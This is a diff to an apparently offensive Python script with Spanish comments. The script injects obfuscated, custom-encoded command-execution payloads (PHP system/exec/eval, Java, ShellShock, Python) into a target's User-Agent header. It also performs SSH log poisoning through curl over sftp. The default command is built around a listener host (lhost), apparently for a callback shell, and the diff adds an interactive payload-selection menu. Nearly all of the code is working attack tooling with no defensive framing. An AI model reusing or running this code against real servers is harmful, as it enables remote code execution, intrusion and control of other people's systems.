@@ -59,22 +59,21 @@ def main():
 
     rhost = args.rhost
     lhost = args.lhost
-    # URL de la aplicación vulnerable
+
     url = ensure_http_prefix(rhost)
 
-    # Payload inyectado en el User-Agent
     cmd = ed.decode(
         "DaIxhHOwyZF-MgHaNJT2Q3UhjH97zNmjf3Y9ZcKeRnP3PIO-HqJ=",
         shift_value,
         substitution_key,
     )
     payloads2 = {
-        "PHP system": "UR9uhMOja3qngECyYFPmW0YSDdrmzDVbAQr7WG8-",
-        "PHP exec": "UR9uhMOjXEmzBwnpL0bMATvlF21nH10dRwH_Dj==",
-        "PHP shell_exec": "UR9uhMOja2mzeEekNAfsDmjiE0rITMxbB21pX10wTmD_Wl==",
-        "PHP passtrhu": "UR9uhMOjaNKnf3YtqqSvOT9FYAFeH2ShCAkiYWqnUn4=",
-        "PHP eval": "UR9uhMOjXEEveAnpL0bMATvlF21nH10dRwH_Dj==",
-        "PHP assert": "UR9uhMOjWESnCVQ0YFPmW0YSDdrmzDVbAQr7WG8-",
+        "PHP system var c": "UR9uhMOja3qngECyYFPmW0YSDdrmH10dRwH_Dj==",
+        "PHP exec": "UR9uhMOjXEmzBwnpL0bMATvlFdrgIAxuSx4=",
+        "PHP shell_exec": "UR9uhMOja2mzeEekNAfsDmjiE0rITMxbBwkiYWqnUn4=",
+        "PHP passtrhu": "UR9uhMOjaNKnf3YtqqSvOT9FYAFeH2RbAQr7WG8-",
+        "PHP eval": "UR9uhMOjXEEveAnpL0bMATvlFdrgIAxuSx4=",
+        "PHP assert": "UR9uhMOjWESnCVQ0YFPmW0YSDdrmH10dRwH_Dj==",
         "Java": "ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=",
         "ShellShock": "PQneldO6M307LA9noZ4cDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQj=",
         "Python": "fK1ui3X0GN9nRwIaqb5gjLQ0GB0rz3RiC2C0NZ52PQghiBEqIZp=",
@@ -136,24 +135,28 @@ def main():
         key: ed.decode(value, shift_value, substitution_key)
         for key, value in payloads2.items()
     }
-    # print(f"Decoded dict: {decoded_dict}")
 
-    formatted_payloads = {}
+    print("[*] Opciones de Payloads disponibles:")
+    for idx, lang in enumerate(decoded_dict.keys(), start=1):
+        print("{}. {} : {}".format(idx, lang, list(decoded_dict.items())[idx-1]))
 
-    for lang, payload in decoded_dict.items():
-        formatted_payloads[lang] = payload.replace("cmd", cmd)
-    # Enviar la solicitud para cada payload
-    for lang, payload in formatted_payloads.items():
-        headers = {"User-Agent": payload}
-        try:
-            response = requests.get(url, headers=headers)
-            print(
-                f"[*] Payload inyectado en {lang}. Respuesta del servidor: {response.status_code}"
-            )
+    # Preguntar al usuario cuál desea ejecutar
+    choice = int(input("\nElige un payload para ejecutar (número): ")) - 1
+    selected_payload = list(decoded_dict.items())[choice]
+    cmd = cmd.replace("{lhost}",lhost)
+    command = input(f"    [!] Some payload needs a command (default: {cmd}): ") or cmd
 
-        except Exception as e:
-            print(f"{e}")
-            print(f"[-] Error request: {url} payload: {payload} e: {e}")
+    # Formatear y enviar la solicitud
+    headers = {
+        "User-Agent": selected_payload[1].replace("cmd",command)
+    }
+    
+    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
+    
+    print(f"\n[*] Ejecutando payload: {selected_payload[0]}")
+    print(f"[*] Código de respuesta: {response.status_code}")
+    print(f"[*] Respuesta del servidor: {response.text}")
+
     # SSH Log Poisoning mediante ssh y curl
     # Define el comando curl con la autenticación y la URL
     url = url.replace("http://", "")
@@ -161,9 +164,7 @@ def main():
     command = [
         "curl",
         "-u",
-        ed.decode(
-            "UR9uhMOja3qngECyYFPmW0YSDdrmzDVbAQr7WG8-", shift_value, substitution_key
-        ),  # Autenticación
+        selected_payload[1].replace("cmd", cmd),  # Autenticación
         "sftp://" + url + "/anything",  # URL del recurso
         "-k",
     ]
